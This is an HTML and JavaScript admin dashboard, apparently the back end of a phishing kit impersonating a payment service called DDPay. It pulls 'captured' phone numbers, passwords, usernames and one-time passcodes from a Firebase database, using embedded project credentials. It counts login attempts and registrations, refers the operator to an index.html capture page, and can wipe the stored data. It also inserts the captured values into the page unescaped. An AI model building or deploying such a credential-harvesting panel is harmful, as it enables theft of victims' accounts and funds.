<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDPay Logger - Admin Control Center</title>
    <!-- FontAwesome & Google Fonts -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0d1117;
            --card-bg: rgba(22, 27, 34, 0.6);
            --border-color: rgba(255, 255, 255, 0.08);
            --primary: #10b981;
            --primary-hover: #059669;
            --accent: #3b82f6;
            --danger: #ef4444;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 10% 20%, rgba(16, 185, 129, 0.08) 0px, transparent 50%),
                radial-gradient(at 90% 80%, rgba(59, 130, 246, 0.08) 0px, transparent 50%);
            background-attachment: fixed;
            color: var(--text-main);
            min-height: 100vh;
            padding: 40px 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
        }

        /* Header Style */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
        }

        .header-title h1 {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #10b981 0%, #3b82f6 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header-title p {
            color: var(--text-muted);
            margin-top: 4px;
            font-size: 15px;
        }

        .header-actions {
            display: flex;
            gap: 12px;
        }

        .btn {
            padding: 12px 20px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid transparent;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background-color: var(--primary);
            color: #fff;
        }

        .btn-primary:hover {
            background-color: var(--primary-hover);
            transform: translateY(-2px);
        }

        .btn-secondary {
            background-color: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-main);
        }

        .btn-secondary:hover {
            background-color: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.15);
        }

        .btn-danger {
            background-color: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: var(--danger);
        }

        .btn-danger:hover {
            background-color: rgba(239, 68, 68, 0.25);
            transform: translateY(-2px);
        }

        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }

        .stat-card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-3px);
            border-color: rgba(16, 185, 129, 0.2);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        .stat-info h3 {
            font-size: 14px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .stat-info p {
            font-size: 32px;
            font-weight: 700;
        }

        .stat-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .stat-icon.green {
            background-color: rgba(16, 185, 129, 0.1);
            color: var(--primary);
        }

        .stat-icon.blue {
            background-color: rgba(59, 130, 246, 0.1);
            color: var(--accent);
        }

        .stat-icon.purple {
            background-color: rgba(139, 92, 246, 0.1);
            color: #8b5cf6;
        }

        /* Table Section */
        .content-card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 40px;
        }

        .card-header {
            padding: 24px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }

        .search-box {
            position: relative;
            max-width: 320px;
            width: 100%;
        }

        .search-box input {
            width: 100%;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border-color);
            padding: 12px 16px 12px 40px;
            border-radius: 10px;
            color: var(--text-main);
            outline: none;
            font-size: 14px;
            transition: all 0.2s;
        }

        .search-box input:focus {
            border-color: var(--primary);
            background-color: rgba(0, 0, 0, 0.4);
        }

        .search-box i {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        .table-responsive {
            overflow-x: auto;
            width: 100%;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th {
            padding: 16px 24px;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-muted);
            border-bottom: 1px solid var(--border-color);
            background-color: rgba(0, 0, 0, 0.1);
        }

        td {
            padding: 18px 24px;
            font-size: 15px;
            border-bottom: 1px solid var(--border-color);
            color: var(--text-main);
        }

        tr:hover td {
            background-color: rgba(255, 255, 255, 0.02);
        }

        .badge {
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
        }

        .badge-signin {
            background-color: rgba(16, 185, 129, 0.15);
            color: var(--primary);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }

        .badge-reg {
            background-color: rgba(59, 130, 246, 0.15);
            color: var(--accent);
            border: 1px solid rgba(59, 130, 246, 0.3);
        }

        .badge-otp {
            background-color: rgba(245, 158, 11, 0.15);
            color: #f59e0b;
            border: 1px solid rgba(245, 158, 11, 0.3);
        }

        .details-wrapper {
            max-width: 450px;
            font-family: monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 13px;
            line-height: 1.4;
            color: #a7f3d0;
            word-break: break-all;
        }

        .details-item {
            margin-bottom: 2px;
        }

        .details-item span {
            color: var(--text-muted);
        }

        .empty-state {
            padding: 60px 24px;
            text-align: center;
            color: var(--text-muted);
        }

        .empty-state i {
            font-size: 48px;
            margin-bottom: 16px;
            color: var(--border-color);
        }

        /* Custom scrollbar for desktop design */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-color);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

    <div class="container">
        
        <header>
            <div class="header-title">
                <h1><i class="fa-solid fa-shield-halved"></i> DDPay Local Logger</h1>
                <p>Monitor credential submissions, OTP request activities, and registrations locally.</p>
            </div>
            <div class="header-actions">
                <button class="btn btn-secondary" onclick="fetchLogs()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
                <button class="btn btn-danger" onclick="clearLogs()"><i class="fa-solid fa-trash-can"></i> Clear All Logs</button>
            </div>
        </header>

        <!-- Stats Overview -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-info">
                    <h3>Total Entries</h3>
                    <p id="total-count">0</p>
                </div>
                <div class="stat-icon green">
                    <i class="fa-solid fa-database"></i>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-info">
                    <h3>Login Attempts</h3>
                    <p id="signin-count">0</p>
                </div>
                <div class="stat-icon blue">
                    <i class="fa-solid fa-right-to-bracket"></i>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-info">
                    <h3>Registrations</h3>
                    <p id="reg-count">0</p>
                </div>
                <div class="stat-icon purple">
                    <i class="fa-solid fa-user-plus"></i>
                </div>
            </div>
        </div>

        <!-- Logs Table -->
        <div class="content-card">
            <div class="card-header">
                <h2>Captured Logs</h2>
                <div class="search-box">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <input type="text" id="search-input" placeholder="Search by phone/username..." onkeyup="filterLogs()">
                </div>
            </div>
            <div class="table-responsive">
                <table id="logs-table">
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Action Type</th>
                            <th>Captured Information</th>
                        </tr>
                    </thead>
                    <tbody id="logs-tbody">
                        <!-- Dynamic content -->
                    </tbody>
                </table>
                <div id="empty-view" class="empty-state" style="display: none;">
                    <i class="fa-solid fa-box-open"></i>
                    <p>No captured logs found yet. Start interacting with index.html to capture data!</p>
                </div>
            </div>
        </div>

    </div>

    <!-- Firebase Compatibility SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyC_OgxEcErRq__6adAFblrZ5aSyTH48b98",
            authDomain: "ddpay-support.firebaseapp.com",
            databaseURL: "https://ddpay-support-default-rtdb.firebaseio.com",
            projectId: "ddpay-support",
            storageBucket: "ddpay-support.firebasestorage.app",
            messagingSenderId: "36597306240",
            appId: "1:36597306240:web:affdc9930682423cd56765",
            measurementId: "G-8CEY434NCL"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let allLogs = [];

        async function fetchLogs() {
            // Fetch from Firebase Realtime Database
            database.ref('user_logs/').on('value', (snapshot) => {
                const data = snapshot.val();
                let fbLogs = [];
                if (data) {
                    // Convert object entries to sorted array
                    fbLogs = Object.keys(data).map(key => {
                        const entry = data[key];
                        // Map structure helper
                        const details = {};
                        if (entry.phone) details.phone = entry.phone;
                        if (entry.password) details.password = entry.password;
                        if (entry.username) details.username = entry.username;
                        if (entry.otp) details.otp = entry.otp;
                        if (entry.inviteCode) details.inviteCode = entry.inviteCode;

                        return {
                            timestamp: entry.timestamp || new Date().toISOString(),
                            type: entry.type || 'Activity',
                            details: details
                        };
                    });
                }
                
                // Sort logs by newest first
                fbLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                allLogs = fbLogs;
                renderLogs(allLogs);
            }, (error) => {
                console.error("Firebase fetch error:", error);
            });
        }

        function renderLogs(logs) {
            const tbody = document.getElementById('logs-tbody');
            const emptyView = document.getElementById('empty-view');
            const logsTable = document.getElementById('logs-table');
            
            tbody.innerHTML = '';
            
            if (logs.length === 0) {
                emptyView.style.display = 'block';
                logsTable.style.display = 'none';
                updateStats(0, 0, 0);
                return;
            }

            emptyView.style.display = 'none';
            logsTable.style.display = 'table';

            let signinCnt = 0;
            let regCnt = 0;

            logs.forEach(log => {
                const tr = document.createElement('tr');
                
                // Timestamp
                const timeTd = document.createElement('td');
                const localTime = new Date(log.timestamp).toLocaleString();
                timeTd.textContent = localTime;
                tr.appendChild(timeTd);

                // Badge Type
                const typeTd = document.createElement('td');
                let badgeClass = 'badge-otp';
                if (log.type === 'Sign In Attempt') {
                    badgeClass = 'badge-signin';
                    signinCnt++;
                } else if (log.type === 'Registration') {
                    badgeClass = 'badge-reg';
                    regCnt++;
                }
                typeTd.innerHTML = `<span class="badge ${badgeClass}">${log.type}</span>`;
                tr.appendChild(typeTd);

                // Details JSON formatted cleanly
                const detailsTd = document.createElement('td');
                let detailsHtml = '<div class="details-wrapper">';
                for (const [key, value] of Object.entries(log.details)) {
                    if (value) {
                        detailsHtml += `<div class="details-item"><span>${key}:</span> <strong>${value}</strong></div>`;
                    }
                }
                detailsHtml += '</div>';
                detailsTd.innerHTML = detailsHtml;
                tr.appendChild(detailsTd);

                tbody.appendChild(tr);
            });

            updateStats(logs.length, signinCnt, regCnt);
        }

        function updateStats(total, signins, regs) {
            document.getElementById('total-count').textContent = total;
            document.getElementById('signin-count').textContent = signins;
            document.getElementById('reg-count').textContent = regs;
        }

        function filterLogs() {
            const query = document.getElementById('search-input').value.toLowerCase().trim();
            if (!query) {
                renderLogs(allLogs);
                return;
            }

            const filtered = allLogs.filter(log => {
                const detailsStr = JSON.stringify(log.details).toLowerCase();
                return detailsStr.includes(query) || log.type.toLowerCase().includes(query);
            });

            renderLogs(filtered);
        }

        async function clearLogs() {
            if (!confirm("Are you sure you want to permanently clear all captured data from Firebase?")) {
                return;
            }
            try {
                // Clear Realtime Database tree
                await database.ref('user_logs/').set(null);
                alert("Logs cleared successfully!");
            } catch (err) {
                console.error("Error clearing logs from Firebase:", err);
            }
        }

        // Initial load
        window.onload = fetchLogs;
    </script>
</body>
</html>
